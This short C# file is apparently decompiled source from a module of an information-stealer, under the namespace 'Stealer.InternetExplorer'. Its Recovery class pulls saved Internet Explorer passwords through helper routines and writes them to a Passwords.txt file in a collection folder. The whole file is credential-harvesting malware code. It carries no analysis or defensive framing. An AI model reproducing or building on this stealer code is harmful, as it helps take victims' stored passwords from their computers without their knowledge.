﻿using System;
using System.Collections.Generic;
using System.IO;

namespace Stealer.InternetExplorer
{
	// Token: 0x02000034 RID: 52
	internal sealed class Recovery
	{
		// Token: 0x060000DA RID: 218 RVA: 0x00007250 File Offset: 0x00005450
		public static void Run(string sSavePath)
		{
			List<Password> list = cPasswords.Get();
			if (list.Count != 0)
			{
				Directory.CreateDirectory(sSavePath + "\\InternetExplorer");
				cBrowserUtils.WritePasswords(list, sSavePath + "\\InternetExplorer\\Passwords.txt");
			}
		}
	}
}
